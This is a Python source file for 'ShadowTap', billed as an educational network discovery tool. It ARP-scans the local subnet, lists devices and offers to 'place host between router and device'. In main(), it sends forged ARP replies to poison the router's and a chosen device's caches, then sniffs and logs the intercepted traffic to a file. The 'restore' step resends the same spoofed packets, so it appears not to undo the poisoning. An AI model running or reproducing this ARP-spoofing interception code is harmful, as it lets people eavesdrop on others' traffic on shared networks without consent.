#!/usr/bin/env python3

"""
ShadowTap - Network Device Discovery Tool
Performs ARP scanning to discover connected devices on the local network.

DISCLAIMER: This code is strictly for educational purposes only. 
Use responsibly and only on networks you have permission to scan.
"""

# importing necessary libraries
import platform, logging, subprocess, ipaddress, random, threading, keyboard, datetime
from scapy.all import ARP, Ether, srp, send, sniff
from rich.console import Console
from rich.table import Table
from rich.align import Align
from rich.panel import Panel
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Prompt

console = Console()
def show_banner():
    ascii_art = [
        '''
  █████████  █████                    █████                             ███████████                    
 ███░░░░░███░░███                    ░░███                             ░█░░░███░░░█                    
░███    ░░░  ░███████    ██████    ███████   ██████  █████ ███ █████   ░   ░███  ░   ██████   ████████ 
░░█████████  ░███░░███  ░░░░░███  ███░░███  ███░░███░░███ ░███░░███        ░███     ░░░░░███ ░░███░░███
 ░░░░░░░░███ ░███ ░███   ███████ ░███ ░███ ░███ ░███ ░███ ░███ ░███        ░███      ███████  ░███ ░███
 ███    ░███ ░███ ░███  ███░░███ ░███ ░███ ░███ ░███ ░░███████████         ░███     ███░░███  ░███ ░███
░░█████████  ████ █████░░████████░░████████░░██████   ░░████░████          █████   ░░████████ ░███████ 
 ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░░░  ░░░░░░     ░░░░ ░░░░          ░░░░░     ░░░░░░░░  ░███░░░  
                                                                                              ░███     
                                                                                              █████    
                                                                                             ░░░░░           
                                                                                                              ''',
    '''
                                                                 
  ▄▄▄▄▄                                        ▄▄▄▄▄▄▄           
 ██▀▀▀▀█▄ █▄             █▄                   █▀▀██▀▀▀▀          
 ▀██▄  ▄▀ ██             ██                      ██              
   ▀██▄▄  ████▄ ▄▀▀█▄ ▄████ ▄███▄▀█▄ █▄ ██▀      ██   ▄▀▀█▄ ████▄
 ▄   ▀██▄ ██ ██ ▄█▀██ ██ ██ ██ ██ ██▄██▄██       ██   ▄█▀██ ██ ██
 ▀██████▀▄██ ██▄▀█▄██▄█▀███▄▀███▀  ▀██▀██▀       ▀██▄▄▀█▄██▄████▀
                                                            ██   
                                                            ▀    
    ''',     
    '''
       ...                                    ..                                             .....                                    
   .x888888hx    :   .uef^"                 dF                       x=~                  .H8888888h.  ~-.                            
  d88888888888hxx  :d88E                   '88bu.             u.    88x.   .e.   .e.      888888888888x  `>              .d``         
 8" ... `"*8888%`  `888E             u     '*88888bu    ...ue888b  '8888X.x888:.x888     X~     `?888888hx~       u      @8Ne.   .u   
!  "   ` .xnxx.     888E .z8k     us888u.    ^"*8888N   888R Y888r  `8888  888X '888k    '      x8.^"*88*"     us888u.   %8888:u@88N  
X X   .H8888888%:   888E~?888L .@88 "8888"  beWE "888L  888R I888>   X888  888X  888X     `-:- X8888x       .@88 "8888"   `888I  888. 
X 'hn8888888*"   >  888E  888E 9888  9888   888E  888E  888R I888>   X888  888X  888X          488888>      9888  9888     888I  888I 
X: `*88888%`     !  888E  888E 9888  9888   888E  888E  888R I888>   X888  888X  888X        .. `"88*       9888  9888     888I  888I 
'8h.. ``     ..x8>  888E  888E 9888  9888   888E  888F u8888cJ888   .X888  888X. 888~      x88888nX"      . 9888  9888   uW888L  888' 
 `88888888888888f   888E  888E 9888  9888  .888N..888   "*888*P"    `%88%``"*888Y"        !"*8888888n..  :  9888  9888  '*88888Nu88P  
  '%8888888888*"   m888N= 888> "888*""888"  `"888*""      'Y"         `~     `"          '    "*88888888*   "888*""888" ~ '88888F`    
     ^"****""`      `Y"   888   ^Y"   ^Y'      ""                                                ^"***"`     ^Y"   ^Y'     888 ^      
                         J88"                                                                                              *8E        
                         @%                                                                                                '8>        
                       :"                                                                                                   "                                                                                                                                                                                                                                
    '''                                                                                                
    ]
    banner = random.choice(ascii_art)
    #banner = ascii_art[-1]
    console.print(Panel(Align.center(banner), title="ShadowTap Network Tool", style="bold magenta", border_style="bright_blue"))



#------------------------------------------------------------------------
# UTILITY FUNCTIONS
#------------------------------------------------------------------------

def gen(text: str, style: str):
    """
    Generate styled console output using Rich formatting.
    
    Args:
        text (str): The text to style
        style (str): Rich style string (e.g., 'bold #ff471a')
    
    Returns:
        str: Formatted string with Rich style markup
    
    Example:
        >>> print(gen("Error occurred!", 'bold #ff471a'))
    """
    output = "[{}]{}[/{}]".format(style, text, style)
    return output


#------------------------------------------------------------------------
# OS DETECTION
#------------------------------------------------------------------------

def detect_os():
    """
    Detect the operating system the script is running on.
    
    Returns:
        str: The lowercase name of the OS ('linux', 'windows', or 'unsupported').
    """
    os_name = platform.system().lower()
    marker = gen(">>>", "bold #ff0cde")
    console.print(gen(f"{marker} Detected OS: {gen(os_name, 'bold #33ff33')}", "bold #3399ff"))
    
    if os_name == 'linux' or os_name == 'windows':
        return os_name
    return 'unsupported'


#------------------------------------------------------------------------
# NETWORK INFORMATION RETRIEVAL
#------------------------------------------------------------------------

def fetch_network_info_linux():
    """
    Fetch the local network CIDR and default gateway IP on Linux systems.
    
    Uses system commands to retrieve the default interface, local IP, subnet mask,
    and gateway. Computes the CIDR notation for the network range.
    
    Returns:
        dict: A dictionary with 'cidr' (str), 'gateway' (str), and 'local_ip' (str).
    
    Raises:
        ValueError: If unable to retrieve network information.
    """
    marker = gen(">>>", "bold #ff0cde")
    console.print(gen(f"{marker} Fetching network info on Linux...", "bold #3399ff"))
    
    try:
        # Get default route info
        cmd = "ip route get 8.8.8.8"
        output = subprocess.check_output(cmd.split()).decode()
        parts = output.split()
        gateway = parts[parts.index('via') + 1]
        iface = parts[parts.index('dev') + 1]
        console.print(gen(f"{marker} Default Gateway: {gen(gateway, 'bold #33ff33')}, Interface: {gen(iface, 'bold #33ff33')}", "bold #3399ff"))
        
        # Get IP and mask for the interface
        cmd = ["ip", "addr", "show", iface]
        output = subprocess.check_output(cmd).decode()
        for line in output.splitlines():
            if 'inet ' in line and 'scope global' in line:
                inet = line.strip().split()[1]  # e.g., '192.168.1.100/24'
                local_ip = inet.split('/')[0]  # Extract just the IP
                network = ipaddress.ip_interface(inet).network
                cidr = str(network)
                console.print(gen(f"{marker} Network CIDR: {gen(cidr, 'bold #33ff33')}", "bold #3399ff"))
                return {'cidr': cidr, 'gateway': gateway, 'local_ip': local_ip}
        
        raise ValueError("Could not find IP/mask for interface")
    
    except Exception as e:
        console.print(gen(f"{marker} Error fetching network info on Linux: {gen(str(e), 'bold #ff471a')}", "bold #ff471a"))
        raise ValueError(f"Failed to fetch network info on Linux: {e}")

#------------------------------------------------------------------------------------------------------------------------------------------------

def fetch_network_info_windows():
    """
    Fetch the local network CIDR and default gateway IP on Windows systems.
    
    Parses the output of 'ipconfig' to find the active network adapter with
    a default gateway, then computes the CIDR notation.
    
    Returns:
        dict: A dictionary with 'cidr' (str), 'gateway' (str), and 'local_ip' (str).
    
    Raises:
        ValueError: If unable to retrieve network information.
    """
    marker = gen(">>>", "bold #ff0cde")
    console.print(gen(f"{marker} Fetching network info on Windows...", "bold #3399ff"))
    
    try:
        output = subprocess.check_output('ipconfig').decode('latin-1')
        lines = output.splitlines()
        #console.print(lines)
        
        ip = None
        mask = None
        gateway = None
        found_adapter = False
        
        for i, line in enumerate(lines):
            line_stripped = line.strip()
            # Detect start of adapter section
            if 'adapter' in line_stripped.lower():
                ip = None
                mask = None
                gateway = None
                found_adapter = False
            if 'IPv4 Address' in line_stripped:
                ip = line_stripped.split(':')[-1].strip()
                found_adapter = True
                console.print(gen(f"{marker} IPv4 Address: {gen(ip, 'bold #33ff33')}", "bold #3399ff"))
            elif 'Subnet Mask' in line_stripped:
                mask = line_stripped.split(':')[-1].strip()
                console.print(gen(f"{marker} Subnet Mask: {gen(mask, 'bold #33ff33')}", "bold #3399ff"))
            elif 'Default Gateway' in line_stripped:
                gateway_value = line_stripped.split(':')[-1].strip()
                # If gateway is empty or IPv6, check the next line for IPv4 continuation
                if (not gateway_value or '%' in gateway_value or (gateway_value and not gateway_value[0].isdigit())) and i + 1 < len(lines):
                    next_line = lines[i + 1].strip()
                    if next_line and next_line[0].isdigit() and '%' not in next_line:
                        gateway_value = next_line
                # Only process non-empty gateways that are IPv4 (start with digits, not IPv6 or containing '%')
                if gateway_value and gateway_value[0].isdigit() and '%' not in gateway_value:
                    gateway = gateway_value
                    console.print(gen(f"{marker} Default Gateway: {gen(gateway, 'bold #33ff33')}", "bold #3399ff"))
            # If all three found in this adapter, return
            if found_adapter and ip and mask and gateway:
                interface = f"{ip}/{mask}"
                network = ipaddress.ip_interface(interface).network
                cidr = str(network)
                console.print(gen(f"{marker} Network CIDR: {gen(cidr, 'bold #33ff33')}", "bold #3399ff"))
                return {'cidr': cidr, 'gateway': gateway, 'local_ip': ip}
        raise ValueError("No active network adapter with valid IPv4 gateway found")
    
    except Exception as e:
        console.print(gen(f"{marker} Error fetching network info on Windows: {gen(str(e), 'bold #ff471a')}", "bold #ff471a"))
        raise ValueError(f"Failed to fetch network info on Windows: {e}")


#------------------------------------------------------------------------
# ARP SCANNING
#------------------------------------------------------------------------

def perform_arp_scan(ip_range, gateway=None):
    """
    Perform an ARP scan on the given IP range to discover connected devices.
    
    Crafts and sends ARP request packets, collects responses, and returns a list
    of devices with their IP and MAC addresses. Ensures the gateway/router is included
    in the results by adding it if not found in the scan.
    
    Args:
        ip_range (str): The network range in CIDR notation (e.g., '192.168.1.0/24').
        gateway (str, optional): The gateway/router IP to ensure is included in results.
    
    Returns:
        list: A list of dictionaries, each with 'ip' and 'mac' keys.
    
    Raises:
        Exception: If ARP scan fails (e.g., insufficient privileges, driver issues).
    """
    marker = gen(">>>", "bold #ff0cde")
    console.print(gen(f"{marker} Starting ARP scan on {gen(ip_range, 'bold #33ff33')}...", "bold #3399ff"))
    
    try:
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]
        
        devices = []
        gateway_found = False
        
        for sent, received in result:
            device_ip = received.psrc
            # Ignore IPs with '%' (IPv6 artifacts)
            if '%' in device_ip:
                continue
            devices.append({'ip': device_ip, 'mac': received.hwsrc})
            if gateway and device_ip == gateway:
                gateway_found = True
        # Only add router if not present by exact IP match
        if gateway and not any(d['ip'] == gateway for d in devices):
            console.print(gen(f"{marker} Gateway {gen(gateway, 'bold #33ff33')} not found in ARP scan, adding it...", "bold #3399ff"))
            devices.append({'ip': gateway, 'mac': 'Unknown'})
        console.print(gen(f"{marker} Scan complete. Found {gen(str(len(devices)), 'bold #33ff33')} devices.", "bold #3399ff"))
        return devices
    
    except Exception as e:
        console.print(gen(f"{marker} Error during ARP scan: {gen(str(e), 'bold #ff471a')}", "bold #ff471a"))
        raise Exception(f"ARP scan failed: {e}")


#------------------------------------------------------------------------
# OUTPUT FORMATTING
#------------------------------------------------------------------------

def print_devices(devices, gateway, local_ip):
    """
    Print the list of discovered devices in a formatted table, highlighting the router and host.
    
    Args:
        devices (list): List of device dictionaries with 'ip' and 'mac'.
        gateway (str): The IP address of the router/default gateway.
        local_ip (str): The IP address of the local host machine.
    """
    marker = gen(">>>", "bold #ff0cde")
    
    if not devices:
        console.print(gen(f"{marker} No devices discovered on the network.", "bold #ff471a"))
        return
    
    console.print(gen(f"{marker} Displaying discovered devices:", "bold #3399ff"))
    
    table = Table(show_header=True, header_style="bold #33cc33", border_style="dim")
    table.add_column("No.", style="bold #ffffff", width=5)
    table.add_column("IP", style="bold #ffffff", width=15)
    table.add_column("MAC", style="bold #ffffff", width=17)
    table.add_column("Type", style="bold #ffffff", width=10)
    
    # Remove any device with IP containing '%' (likely IPv6 artifact) or MAC 'Unknown' unless it's the gateway
    filtered_devices = []
    for device in devices:
        if '%' in device['ip'] and device['ip'] != gateway:
            continue
        if device['mac'] == 'Unknown' and device['ip'] != gateway:
            continue
        filtered_devices.append(device)

    numbered_devices = []
    ip_dict = {"gateway": gateway, "host": local_ip}
    for idx, device in enumerate(filtered_devices, 1):
        if device['ip'] == gateway:
            device_type = "(Router)"
            ip_dict["Router"] = device['ip']
        elif device['ip'] == local_ip:
            device_type = "(Host)"
            ip_dict["Host"] = device['ip']
        else:
            device_type = f"Device {idx}"
            ip_dict[f"Device {idx}"] = device['ip']
        row_style = "on #333333" if device_type in ["(Router)", "(Host)"] else ""
        table.add_row(
            str(idx),
            gen(device['ip'], 'bold #33ff33'),
            gen(device['mac'], 'bold #33ff33'),
            gen(device_type, 'bold #ff0cde'),
            style=row_style
        )
        numbered_devices.append({'idx': idx, 'ip': device['ip'], 'mac': device['mac'], 'type': device_type})
    console.print(table)

    # Interactive selection
    # Host should be option 2, followed by Device 3, Device 4, etc.
    selectable = []
    host_device = next((d for d in numbered_devices if d['type'] == "(Host)"), None)
    device_options = [d for d in numbered_devices if d['type'] not in ["(Router)", "(Host)"]]
    idx_counter = 2
    if host_device:
        selectable.append({'idx': idx_counter, 'ip': host_device['ip'], 'mac': host_device['mac'], 'type': '(Host)'})
        idx_counter += 1
    for d in device_options:
        selectable.append({'idx': idx_counter, 'ip': d['ip'], 'mac': d['mac'], 'type': d['type']})
        idx_counter += 1
    if not selectable:
        console.print(gen("No selectable devices found.", "bold #ff471a"), style="bold #ff471a")
        return None, ip_dict
    marker = gen(">>>", "bold #ff0cde")
    console.print(f"\n{marker} Select a device to place host between router and device or monitor between host and gateway:")
    for d in selectable:
        label = f"Host ({d['ip']})" if d['type'] == '(Host)' else f"{d['type']} ({d['ip']})"
        console.print(f"{d['idx']}: {label}")
    while True:
        try:
            console.print(f"{marker} Enter device number:", style="bold #ff0cde")
            choice = int(input())
            selected = next((d for d in selectable if d['idx'] == choice), None)
            if selected:
                console.print(f"{marker} Selected device: {selected['ip']}")
                return selected['ip'], ip_dict, selected['type']
            else:
                console.print(f"{marker} Invalid selection. Try again.")
        except ValueError:
            console.print(f"{marker} Invalid input. Enter a number.")
        except Exception as e:
            console.print(gen(f"Unexpected error: {e}", 'bold #ff471a'))


#------------------------------------------------------------------------
# MAIN EXECUTION
#------------------------------------------------------------------------

def main():
    """
    Main execution function orchestrating the entire network discovery process.
    
    Flow:
        1. Detect the operating system
        2. Fetch network information (IP range and gateway)
        3. Perform ARP scan on the network
        4. Display discovered devices
    """
    marker = gen(">>>", "bold #ff0cde")
    show_banner()
    console.print(Panel(gen("\nShadowTap Builder Initiated...\n", "bold #33cc33"), border_style="bright_blue"))
    
    try:
        os_type = detect_os()

        if os_type == 'unsupported':
            console.print(gen("Unsupported OS. This script supports Linux and Windows only.", "bold #ff471a"))
            return

        # Fetch network information based on OS
        if os_type == 'linux':
            info = fetch_network_info_linux()
        elif os_type == 'windows':
            info = fetch_network_info_windows()

        ip_range = info['cidr']
        gateway = info['gateway']
        local_ip = info['local_ip']

        console.print(gen(f"{marker} Scanning network: {gen(ip_range, 'bold #33ff33')}", "bold #3399ff"))
        console.print(gen(f"{marker} Default Gateway (Router): {gen(gateway, 'bold #33ff33')}", "bold #3399ff"))
        console.print(gen(f"{marker} Local Host IP: {gen(local_ip, 'bold #33ff33')}", "bold #3399ff"))

        # Perform ARP scan and display results
        devices = perform_arp_scan(ip_range, gateway)
        selected_ip, ip_dict, selected_type = print_devices(devices, gateway, local_ip)
        if selected_ip:
            try:
                # If Host is selected, monitor between Host and Gateway
                if selected_type == '(Host)':
                    ip1 = local_ip
                    ip2 = gateway
                    monitor_line = gen('[+]', 'bold #00ff00') + ' Monitoring traffic between ' + gen(ip1, 'bold #33ff33') + ' <-> ' + gen(ip2, 'bold #33ff33') + '...'
                    console.print(monitor_line)
                    show_dynamic = Prompt.ask(gen("Do you want to see dynamically printed packet info? (y/n): ", "bold #ff0cde"), choices=["y", "n"], default="n", show_default=False).strip().lower()
                    packet_count = 0
                    stop_sniff = threading.Event()
                    log_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                    log_filename = f"shadow_tap_{log_time}.log"
                    logging.basicConfig(
                        filename=log_filename,
                        filemode='a',
                        format='%(asctime)s - %(message)s',
                        datefmt='%Y-%m-%d %H:%M:%S',
                        level=logging.INFO
                    )

                    packet_panel_data = []
                    def count_packets(pkt):
                        nonlocal packet_count
                        packet_count += 1
                        pkt_info = pkt.summary()
                        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        # Log to file with timestamp
                        logging.info(pkt_info)
                        # Store for panel
                        packet_panel_data.append(f"[{timestamp}] {pkt_info}")
                        if show_dynamic == 'y':
                            live.update(Panel("\n".join(packet_panel_data[-10:]), title="Packet Captured", style="bold green", border_style="bright_blue"))
                        else:
                            console.print(
                                gen('Packets transferred: ', 'bold #33cc33') + gen(str(packet_count), 'bold #ff0cde'), end="\r"
                            )

                    def sniff_packets():
                        try:
                            sniff(filter=f"host {ip1} or host {ip2}", prn=count_packets, store=0, stop_filter=lambda x: stop_sniff.is_set())
                        except Exception as e:
                            console.print(gen(f"Error sniffing packets: {e}", 'bold #ff471a'))

                    sniff_thread = threading.Thread(target=sniff_packets)
                    esc_msg = gen('Press ESC to terminate and restore normal activity.', 'bold #ff0cde')
                    if show_dynamic == 'y':
                        with Live(Panel("Waiting for packets...", title="Packet Captured", style="bold green", border_style="bright_blue"), refresh_per_second=4, console=console) as live:
                            sniff_thread.start()
                            console.print(esc_msg)
                            def monitor_esc():
                                while True:
                                    if keyboard.is_pressed('esc'):
                                        stop_sniff.set()
                                        break
                            esc_thread = threading.Thread(target=monitor_esc)
                            esc_thread.start()
                            sniff_thread.join()
                            esc_thread.join()
                    else:
                        sniff_thread.start()
                        console.print(esc_msg)
                        def monitor_esc():
                            while True:
                                if keyboard.is_pressed('esc'):
                                    stop_sniff.set()
                                    break
                        esc_thread = threading.Thread(target=monitor_esc)
                        esc_thread.start()
                        sniff_thread.join()
                        esc_thread.join()
                    console.print(gen('Monitoring ended.', 'bold #00ff00'))

                    # Save log file summary
                    try:
                        console.print(gen(f"Packet log saved as {log_filename}", 'bold #33cc33'))
                        summary_msg = gen('[+]', 'bold #00ff00') + ' Log file written to: ' + gen(log_filename, 'bold #ff0cde')
                        console.print(summary_msg)
                    except Exception as e:
                        console.print(gen(f"Error saving log file: {e}", 'bold #ff471a'))
                else:
                    # Spoof router: tell router that host is selected device
                    spoof_router = ARP(op=2, pdst=gateway, psrc=selected_ip, hwdst=devices[0]['mac'])
                    # Spoof selected device: tell device that host is router
                    spoof_device = ARP(op=2, pdst=selected_ip, psrc=gateway, hwdst=devices[0]['mac'])
                    console.print(gen('\n[+]', 'bold #00ff00') + ' Routing traffic via host...')
                    send(spoof_router, verbose=False)
                    send(spoof_device, verbose=False)
                    console.print(gen('\n[+]', 'bold #00ff00') + ' Host is now between router and selected device.')

                    # Prompt for dynamic packet info
                    show_dynamic = Prompt.ask(gen("Do you want to see dynamically printed packet info? (y/n): ", "bold #ff0cde"), choices=["y", "n"], default="n", show_default=False).strip().lower()
                    packet_count = 0
                    stop_sniff = threading.Event()

                    # Color-coded monitoring info
                    arrow = gen('<->', 'bold #ff0cde')
                    ip1 = gen(gateway, 'bold #33ff33')
                    ip2 = gen(selected_ip, 'bold #33ff33')
                    monitor_line = gen('[+]', 'bold #00ff00') + ' Monitoring traffic between ' + ip1 + f' {arrow} ' + ip2 + '...'
                    console.print(monitor_line)

                    # Prepare log file
                    log_packets = []
                    log_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                    log_filename = f"shadow_tap_{log_time}.log"

                    packet_panel_data = []
                    def count_packets(pkt):
                        nonlocal packet_count
                        packet_count += 1
                        # Log packet info
                        log_packets.append(pkt.summary())
                        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        packet_panel_data.append(f"[{timestamp}] {pkt.summary()}")
                        if show_dynamic == 'y':
                            live.update(Panel("\n".join(packet_panel_data[-10:]), title="Packet Captured", style="bold green", border_style="bright_blue"))
                        else:
                            console.print(
                                gen('Packets transferred: ', 'bold #33cc33') + gen(str(packet_count), 'bold #ff0cde'), end="\r"
                            )

                    def sniff_packets():
                        try:
                            sniff(filter=f"host {gateway} or host {selected_ip}", prn=count_packets, store=0, stop_filter=lambda x: stop_sniff.is_set())
                        except Exception as e:
                            console.print(gen(f"Error sniffing packets: {e}", 'bold #ff471a'))

                    sniff_thread = threading.Thread(target=sniff_packets)
                    esc_msg = gen('Press ESC to terminate and restore normal activity.', 'bold #ff0cde')
                    if show_dynamic == 'y':
                        with Live(Panel("Waiting for packets...", title="Packet Captured", style="bold green", border_style="bright_blue"), refresh_per_second=4, console=console) as live:
                            sniff_thread.start()
                            console.print(esc_msg)
                            def monitor_esc():
                                while True:
                                    if keyboard.is_pressed('esc'):
                                        stop_sniff.set()
                                        break
                            esc_thread = threading.Thread(target=monitor_esc)
                            esc_thread.start()
                            sniff_thread.join()
                            esc_thread.join()
                    else:
                        sniff_thread.start()
                        console.print(esc_msg)
                        def monitor_esc():
                            while True:
                                if keyboard.is_pressed('esc'):
                                    stop_sniff.set()
                                    break
                        esc_thread = threading.Thread(target=monitor_esc)
                        esc_thread.start()
                        sniff_thread.join()
                        esc_thread.join()
                    console.print(gen('Monitoring ended.', 'bold #00ff00'))

                    # Save log file
                    try:
                        with open(log_filename, 'w') as f:
                            f.write(f"ShadowTap Packet Log - {log_time}\n")
                            f.write(f"Monitoring between {gateway} <-> {selected_ip}\n")
                            f.write(f"Packets captured: {packet_count}\n\n")
                            for pkt in log_packets:
                                f.write(pkt + '\n')
                        console.print(gen(f"Packet log saved as {log_filename}", 'bold #33cc33'))
                        summary_msg = gen('[+]', 'bold #00ff00') + ' Log file written to: ' + gen(log_filename, 'bold #ff0cde')
                        console.print(summary_msg)
                    except Exception as e:
                        console.print(gen(f"Error saving log file: {e}", 'bold #ff471a'))

                    # Restore ARP tables
                    restore_router = ARP(op=2, pdst=gateway, psrc=selected_ip, hwdst=devices[0]['mac'])
                    restore_device = ARP(op=2, pdst=selected_ip, psrc=gateway, hwdst=devices[0]['mac'])
                    send(restore_router, verbose=False)
                    send(restore_device, verbose=False)
                    console.print(gen('[+]', 'bold #00ff00') + ' Host removed. Normal activity restored.')
            except Exception as e:
                console.print(gen(f"Error in routing/monitoring logic: {e}", 'bold #ff471a'))
    except Exception as e:
        console.print(gen(f"Error in main execution: {e}", 'bold #ff471a'))

if __name__ == "__main__":
    print('\n\n\n')
    main()
    console.print(gen("\n\n\nShadowTap execution completed.\n\n\n", "bold #33cc33"))
